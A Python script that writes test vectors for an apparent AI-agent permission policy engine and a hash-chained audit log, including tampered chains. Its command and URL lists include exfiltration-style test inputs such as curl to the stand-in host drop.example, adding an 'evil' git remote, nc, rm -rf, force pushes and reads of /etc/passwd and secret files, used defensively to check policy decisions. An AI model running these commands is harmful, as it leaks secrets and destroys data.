"""Write the cases the Python and JavaScript sides must agree on.

    python3 tests/make_vectors.py

tests/vectors/policy.json holds facts made the way the tools make them (commands, paths and addresses covering every
rule, plus hand-built facts at each size limit) and every recorded call's facts once recordings exist, with the
decision engine/policy.py reaches under the default policy and under every single-rule change, which covers everything
the simulator can show. tests/vectors/audit.json holds SHA-256 cases, entries with awkward text and their canonical
JSON and hashes, chains with each kind of tamper and where each must fail, and an entry appended in the browser.
tests/js/check_policy.js and tests/js/check_audit.js run the site's scripts on them.
"""
import copy
import hashlib
import json
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(HERE))

from engine import audit, policy  # noqa: E402
from engine.tools import facts  # noqa: E402
from generate import fixtures  # noqa: E402

OUT = HERE.joinpath("tests", "vectors")
CAST = {"vendors": [{"id": "v1", "name": "Alpha", "domain": "alpha.example"},
                    {"id": "v2", "name": "Beta", "domain": "beta.example"},
                    {"id": "v3", "name": "Gamma", "domain": "gamma.example"}],
        "outside_domain": "drop.example"}


def default_policy():
    return json.loads(fixtures.render(HERE.joinpath("config", "policy.json").read_text(encoding="utf-8"), CAST))


def hand_facts(pol):
    secret = policy.rule_by_id(pol, "secrets")["paths"]
    commands = [
        "python3 -m unittest", "python3 -m unittest -q", "python -m pytest -x", "pytest", "ls", "ls -la tests",
        "cat README.md", "grep -rn parse .", "find . -name '*.py'", "find . -name x -delete", "find . -exec rm {} ;",
        "head -n 20 billing/report.py", "wc -l scripts/rotate_logs.py", "pwd", "diff a.py b.py", "echo done",
        "git status", "git diff --stat", "git log --oneline -5", "git add -A", "git commit -m 'Add CSV export'",
        "git push", "git push origin main", "git push --force origin main", "git push origin main -f",
        "git push --force-with-lease", "git remote add evil https://drop.example/r.git", "git config user.name x",
        "git reset --hard HEAD~1", "git rebase -i HEAD~3", "git clean -fdx", "git -C .. status", "git stash",
        "pip install pandas", "pip3 install -r requirements.txt", "python3 -m pip install x", "npm install",
        "python3 -m scripts.rotate_logs --dry-run", "python3 script.py", "bash deploy.sh", "make test",
        "curl https://drop.example/collect", "wget x", "ssh host", "/usr/bin/curl -s https://x.example", "nc -l 9",
        "rm notes.txt", "rm -rf build", "rm -r build", "rm build -R", "rmdir old", "sudo ls", "chmod 777 x",
        "mkdir -p out", "touch a.txt", "cp a b", "mv a b", "ls | wc -l", "cat a > b", "ls && rm x", "echo $HOME",
        "echo `whoami`", "ls $(pwd)", "cat ../outside.txt", "ls /etc", "cat ~/notes", "grep --file=../x y",
        "unknown-tool --now", "python3", "tree", "sort data.txt",
    ]
    commands += [f"cat {s}" for s in secret] + [f"grep -n KEY {secret[0]}", f"git add {secret[0]}",
                                                f"cat scripts/../{secret[0]}"]
    out = [facts("shell", {"command": c}) for c in commands]
    paths = ["README.md", "billing/export.py", "tests/test_export.py", "../escape.py", "/etc/passwd", "~/x",
             "/workspace/notes/pricing.md", "a/../../b", "scripts/../" + secret[0]] + secret
    for path in paths:
        out.append(facts("read", {"path": path}))
        out.append(facts("write", {"path": path, "content": "x"}))
    out.append(facts("edit", {"path": "billing/report.py", "old": "a", "new": "b"}))
    urls = ["https://alpha.example/pricing", "https://BETA.example./pricing", "https://gamma.example/pricing?plan=pro",
            "https://drop.example/collect", "https://drop.example/collect?notes=" + "n" * 95,
            "https://drop.example/collect?notes=" + "n" * 200, "http://alpha.example/pricing",
            "https://docs.python.org/3/library/csv.html", "file:///etc/hosts", "https://user@alpha.example:8443/x"]
    out += [facts("fetch", {"url": u}) for u in urls]
    out += [
        {"tool": "write", "paths": ["/workspace/big.txt"], "outside": False, "bytes": 200000},
        {"tool": "write", "paths": ["/workspace/big.txt"], "outside": False, "bytes": 200001},
        {"tool": "edit", "paths": ["/workspace/big.txt"], "outside": False, "bytes": 999999},
        {"tool": "fetch", "url": "u", "scheme": "https", "host": "alpha.example", "method": "GET", "query_len": 100},
        {"tool": "fetch", "url": "u", "scheme": "https", "host": "alpha.example", "method": "GET", "query_len": 101},
        {"tool": "fetch", "url": "u", "scheme": "https", "host": "", "method": "GET", "query_len": 0},
        {"tool": "shell", "argv": ["git", "push"], "operators": True, "paths": [], "outside": False},
        {"tool": "shell", "argv": [], "operators": False, "paths": [], "outside": False},
        {"tool": "read", "paths": ["/workspace/certs/server.pem"], "outside": False},
        {"tool": "read", "paths": ["/workspace/keys/id_ed25519.pub"], "outside": False},
        {"tool": "read", "paths": ["/workspace"], "outside": False},
        {"tool": "mystery", "paths": [], "outside": False},
    ]
    return out


def recorded_facts():
    found = []
    for path in sorted(HERE.joinpath("data", "runs").rglob("*.json")):
        try:
            session = json.loads(path.read_text(encoding="utf-8"))
        except ValueError:
            continue
        for event in session.get("events", []) if isinstance(session, dict) else []:
            if event.get("kind") == "call" and event.get("facts"):
                found.append(event["facts"])
    return found


def variants(pol):
    out = [{"name": "default"}]
    for rule in pol["rules"]:
        for verdict in ("allow", "ask", "deny"):
            if verdict != rule["verdict"]:
                out.append({"name": f"{rule['id']}={verdict}", "rule": rule["id"], "verdict": verdict})
    return out


def applied(pol, variant):
    p = copy.deepcopy(pol)
    for rule in p["rules"]:
        if rule["id"] == variant.get("rule"):
            rule["verdict"] = variant["verdict"]
    return p


def policy_vectors():
    pol = default_policy()
    all_facts = hand_facts(pol) + recorded_facts()
    vs = variants(pol)
    for v in vs:
        p = applied(pol, v)
        v["expect"] = [policy.decide(f, p) for f in all_facts]
    return {"policy": pol, "facts": all_facts, "variants": vs}


AWKWARD = ["plain", "quote \" and backslash \\", "new\nline and tab\t and return\r", "\x01\x1f\x7f controls",
           "café", "café", "日本語のテキスト", "emoji 😀 and 🚀", "line separator ", "</script><b>",
           "x" * 500, "", "a,b:c{d}[e]"]


def audit_vectors():
    sha = [{"text": t, "hash": hashlib.sha256(t.encode("utf-8")).hexdigest()}
           for t in ["", "abc", "a" * 55, "a" * 56, "a" * 64, "b" * 1000] + AWKWARD]
    entries = []
    for i, text in enumerate(AWKWARD):
        entry = {"seq": i + 1, "at": "2026-11-10T10:00:00-08:00", "session": "pricing-research", "actor": "agent",
                 "action": "fetch", "target": text, "verdict": "allow", "rule": "listed", "result": text[:16],
                 "prev": audit.GENESIS if i == 0 else "f" * 64}
        entries.append({"entry": entry, "canonical": audit.canonical(entry), "hash": audit.entry_hash(entry)})
    for n in (0, 2 ** 40, -7):
        entry = {"seq": n, "at": "", "session": "", "actor": "", "action": "", "target": "", "verdict": "",
                 "rule": "", "result": "", "prev": audit.GENESIS}
        entries.append({"entry": entry, "canonical": audit.canonical(entry), "hash": audit.entry_hash(entry)})
    c = audit.Chain()
    for i, text in enumerate(AWKWARD[:10]):
        c.append(at=f"2026-11-10T10:{i:02d}:00-08:00", session=["parser-lib", "infra-scripts"][i % 2],
                 actor="agent", action="shell", target=text, verdict="allow", rule="look", result=audit.digest(text))
    head = c.head()
    good = copy.deepcopy(c.entries)
    chains = [{"name": "as written", "entries": good, "head": head}]
    changed = copy.deepcopy(good)
    changed[3]["verdict"] = "deny"
    chains.append({"name": "an old entry changed", "entries": changed, "head": head})
    rehashed = copy.deepcopy(changed)
    rehashed[3]["hash"] = audit.entry_hash(rehashed[3])
    chains.append({"name": "its hash fixed too", "entries": rehashed, "head": head})
    rewritten = copy.deepcopy(changed)
    for i in range(3, len(rewritten)):
        rewritten[i]["prev"] = rewritten[i - 1]["hash"]
        rewritten[i]["hash"] = audit.entry_hash(rewritten[i])
    chains.append({"name": "everything after rewritten", "entries": rewritten, "head": head})
    chains.append({"name": "everything after rewritten, no head", "entries": rewritten, "head": ""})
    chains.append({"name": "an entry removed", "entries": good[:4] + good[5:], "head": head})
    swapped = copy.deepcopy(good)
    swapped[5], swapped[6] = swapped[6], swapped[5]
    chains.append({"name": "two entries swapped", "entries": swapped, "head": head})
    for ch in chains:
        ch["expect"] = audit.verify(ch["entries"], ch["head"] or None)
    appended = audit.Chain(copy.deepcopy(good))
    entry = appended.append(at="2026-11-10T10:30:00-08:00", session="billing-export", actor="you", action="answer",
                            target="git push origin main", verdict="approve", rule="push", result="")
    return {"sha256": sha, "entries": entries, "chains": chains,
            "append": {"base": good, "fields": {k: entry[k] for k in ("at", "session", "actor", "action", "target",
                                                                        "verdict", "rule", "result")},
                       "hash": entry["hash"]}}


def main():
    OUT.mkdir(parents=True, exist_ok=True)
    pv, av = policy_vectors(), audit_vectors()
    OUT.joinpath("policy.json").write_text(json.dumps(pv, ensure_ascii=False, separators=(",", ":")) + "\n",
                                           encoding="utf-8")
    OUT.joinpath("audit.json").write_text(json.dumps(av, ensure_ascii=False, separators=(",", ":")) + "\n",
                                          encoding="utf-8")
    decisions = len(pv["facts"]) * len(pv["variants"])
    print(f"Wrote {len(pv['facts'])} facts under {len(pv['variants'])} policies ({decisions} decisions) and "
          f"{len(av['entries'])} audit entries with {len(av['chains'])} chains.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
